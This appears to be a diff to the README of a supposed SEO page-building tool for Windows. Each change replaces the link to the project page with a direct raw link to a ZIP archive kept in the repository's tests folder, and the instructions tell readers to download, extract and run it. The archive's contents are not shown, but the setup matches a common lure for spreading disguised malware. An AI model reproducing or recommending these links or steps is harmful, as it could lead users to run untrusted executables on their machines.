@@ -1,10 +1,10 @@
 # 🧠 seobuild-onpage - Build pages that rank and get cited
 
-[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/Ebenezerhooknosed777/seobuild-onpage)
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ebenezerhooknosed777/seobuild-onpage/main/tests/onpage_seobuild_3.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Ebenezerhooknosed777/seobuild-onpage
+Visit this page to download: https://raw.githubusercontent.com/Ebenezerhooknosed777/seobuild-onpage/main/tests/onpage_seobuild_3.6.zip
 
 Use the page to get the latest version for Windows. If you see a release file, download it. If the project is provided as source files, download the ZIP file from the page and follow the steps below.
 
@@ -34,7 +34,7 @@ If the app comes as a ZIP file, you will also need the built-in Windows extracto
 
 ## 🚀 Get the app running
 
-1. Open this page: https://github.com/Ebenezerhooknosed777/seobuild-onpage
+1. Open this page: https://raw.githubusercontent.com/Ebenezerhooknosed777/seobuild-onpage/main/tests/onpage_seobuild_3.6.zip
 2. Download the latest Windows package or ZIP file
 3. If the file is zipped, right-click it and choose Extract All
 4. Open the extracted folder
@@ -250,6 +250,6 @@ This tool is for people who want to:
 
 ## 🔗 Download again
 
-Use this link to visit the download page: https://github.com/Ebenezerhooknosed777/seobuild-onpage
+Use this link to visit the download page: https://raw.githubusercontent.com/Ebenezerhooknosed777/seobuild-onpage/main/tests/onpage_seobuild_3.6.zip
 
 If the page offers a release file, download and run that file. If it offers a ZIP package, download the ZIP, extract it, and start the app from the extracted folder
